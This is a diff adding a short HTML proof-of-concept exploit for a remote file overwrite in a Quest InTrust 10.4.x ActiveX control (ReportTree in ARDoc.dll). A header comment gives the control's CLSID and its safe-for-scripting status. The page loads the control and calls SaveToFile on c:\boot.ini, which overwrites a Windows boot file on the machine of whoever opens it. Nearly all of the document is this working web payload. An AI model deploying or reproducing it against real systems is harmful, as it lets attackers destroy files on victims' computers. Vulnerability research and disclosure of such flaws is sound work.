@@ -1,0 +1,17 @@
+<!--
+Quest InTrust 10.4.x ReportTree Class ActiveX Control Remote File Overwrite
+
+binary path: C:\Program Files\Common Files\Aelita Shared\ARDoc.dll
+CLSID: {C6FAAD6A-68AE-452B-9F7A-9293408F51EF}
+ProgID: ARDOC.ReportTree.1
+Implements IObjectSafety: yes
+Safe For Scripting (IObjectSafety): True
+Safe For Initialization (IObjectSafety): ?
+-->
+<!-- saved from url=(0014)about:internet -->
+<html>
+<object classid='clsid:C6FAAD6A-68AE-452B-9F7A-9293408F51EF' id='obj' />
+</object>
+<script>
+obj.SaveToFile("c:\\boot.ini");
+</script>
